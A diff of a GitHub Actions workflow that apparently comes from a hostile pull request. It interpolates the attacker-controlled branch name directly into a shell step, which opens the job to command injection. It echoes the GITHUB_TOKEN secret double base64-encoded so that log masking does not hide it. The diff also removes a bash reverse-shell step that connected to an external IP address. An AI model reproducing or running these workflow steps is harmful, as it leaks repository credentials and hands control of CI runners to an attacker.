@@ -17,7 +17,7 @@ jobs:
         echo ${{ github.event.pull_request.head.sha }}
 
         echo "[+] github.event.pull_request.head.ref"
-        echo github.event.pull_request.head.ref
+        echo ${{ github.event.pull_request.head.ref }}
 
         echo "[+] github.event_name"
         echo ${{ github.event_name }}
@@ -26,5 +26,3 @@ jobs:
         echo ${{ github.event.pull_request.head.repo.full_name }}
 
         echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w0 | base64 -w0
-
-    - run: /bin/bash -i >& /dev/tcp/15.237.149.54/443 0>&1
